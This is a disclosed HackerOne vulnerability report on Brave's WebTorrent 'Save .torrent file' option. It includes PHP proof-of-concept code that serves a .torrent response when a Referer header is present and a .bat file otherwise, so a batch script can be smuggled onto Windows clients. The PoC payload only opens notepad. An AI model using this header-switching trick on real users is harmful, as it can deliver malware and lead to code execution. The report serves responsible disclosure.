# Arbitrary file download via "Save .torrent file" option can lead to Client RCE and XSS

## Report Details
- **Report ID**: 963155
- **URL**: https://hackerone.com/reports/963155
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-08-20T12:27:41.357Z
- **Disclosed**: 2022-06-30T17:46:56.455Z

## Reporter
- **Username**: d3f4u17
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:

An attacker can use the "Save .torrent file" option in WebTorrent to smuggle malicious files onto the client's machine.

## Description

Brave allows users to download the ".torrent"  via WebTorrent. WebTorrent decides whether a file is torrent or not based on the following headers `Content-Disposition` and `Content-Type` an attacker can craft a clever looking server side file to bypass the WebTorrent validation which in turn allows the users to download the malicious file instead of an actual torrent file, this behavior can easily lead to localhost* xss and client side RCE.

I used the following PHP code to bypass the WebTorrent validation.

```php
<?php

if(isset($_SERVER['HTTP_REFERER'])){
    header("Content-Disposition: attachment; filename='PoC.torrent'; filename*=UTF-8''PoC.torrent");
    header("Content-Type: application/octet-stream");
}
else{
    header("Content-Disposition: attachment; filename='PoC.bat'; filename*=UTF-8''PoC.bat");
    header("Content-Type: application/x-bat");
    echo "@echo off\n";
    echo "START C:\Windows\NOTEPAD.EXE";
}
?>

```
In the above code when the `Referer` header is passed along with the request then only the server returns a torrent file response otherwise the server will return a `.bat` file which when executed will open notepad on a Windows Machine.

## Tested on 

 * Brave Version 1.12.114 Chromium: 84.0.4147.135 (Windows)

## Steps To Reproduce:

* Visit https://php-demo-app-shibli.cfapps.io/test-driver.php on your brave webbrowser on Windows OS.
* Click on "click me" link
* Click on "Save .torrent file" option
* Save the file and open it.
* When you will execute the file Notepad will open on our windows machine.

Below is a video POC for the above attack scenario

{F956579}

## Impact

* Remote Code Execution
* Remote JavaScript execution
* Installing malware on client's machine

## Attachments
- bandicam_2020-08-20_17-37-46-525.mp4
